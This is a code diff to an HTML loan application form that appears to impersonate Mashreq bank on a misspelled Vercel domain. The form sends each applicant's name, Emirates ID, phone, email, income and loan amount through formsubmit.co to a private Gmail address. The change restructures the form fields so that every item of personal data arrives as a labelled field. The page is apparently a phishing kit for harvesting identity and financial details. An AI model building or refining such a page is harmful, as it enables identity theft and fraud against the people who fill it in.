@@ -83,10 +83,9 @@
       <div class="card">
         <form id="loan-form" method="post" action="https://formsubmit.co/afzal056m@gmail.com" novalidate autocomplete="on">
           <input type="hidden" name="_captcha" value="false">
-          <input type="hidden" name="_template" value="box">
+          <input type="hidden" name="_template" value="basic">
           <input type="hidden" name="_subject" id="mail-subject" value="Loan application">
           <input type="hidden" name="_next" id="mail-next" value="https://mashrqloan2026perosnal-business-pol.vercel.app/?sent=1">
-          <input type="hidden" name="message" id="mail-message" value="">
           <p class="sr-only" aria-live="polite" id="live"></p>
           <div class="grid">
             <div class="field span-2" data-field="fullName">
@@ -279,19 +278,31 @@
         }
         var reference = "ML-" + new Date().getFullYear() + ("0" + (new Date().getMonth() + 1)).slice(-2) + ("0" + new Date().getDate()).slice(-2) + "-" + String(Math.floor(100000 + Math.random() * 900000));
         var prettyPhone = "+971 " + phone.slice(0, 2) + " " + phone.slice(2, 5) + " " + phone.slice(5);
-        var lines = [
-          "Full name: " + name,
-          "Loan category: " + category,
-          "Emirates ID: " + fieldValue("emiratesId"),
-          "Phone number: " + prettyPhone,
-          "Email: " + email,
-          "Monthly income: AED " + fieldValue("monthlyIncome"),
-          "Required loan: AED " + fieldValue("loanAmount"),
-          "Mashreq customer: " + (customer === "yes" ? "Yes" : "No"),
-          "Reference: " + reference
-        ];
+        document.getElementById("fullName").name = "Full name";
+        document.getElementById("loanCategory").name = "Loan category";
+        document.getElementById("emiratesId").name = "Emirates ID";
+        document.getElementById("phone").name = "Phone number";
+        document.getElementById("phone").value = prettyPhone;
+        document.getElementById("email").name = "Email";
+        var incomeField = document.getElementById("monthlyIncome");
+        var loanField = document.getElementById("loanAmount");
+        var incomeText = incomeField.value;
+        var loanText = loanField.value;
+        incomeField.name = "Monthly income";
+        incomeField.value = "AED " + incomeText;
+        loanField.name = "Required loan";
+        loanField.value = "AED " + loanText;
+        var choices = form.querySelectorAll("input[name='mashreqCustomer']");
+        for (var c = 0; c < choices.length; c += 1) {
+          choices[c].name = "Mashreq customer";
+          if (choices[c].checked) choices[c].value = customer === "yes" ? "Yes" : "No";
+        }
+        var referenceField = document.createElement("input");
+        referenceField.type = "hidden";
+        referenceField.name = "Reference";
+        referenceField.value = reference;
+        form.appendChild(referenceField);
         document.getElementById("mail-subject").value = "Loan application from " + name;
-        document.getElementById("mail-message").value = lines.join("\n");
         document.getElementById("mail-next").value = "https://mashrqloan2026perosnal-business-pol.vercel.app/?sent=1&ref=" + encodeURIComponent(reference);
         var button = form.querySelector("button[type='submit']");
         if (button) button.textContent = "Sending application…";
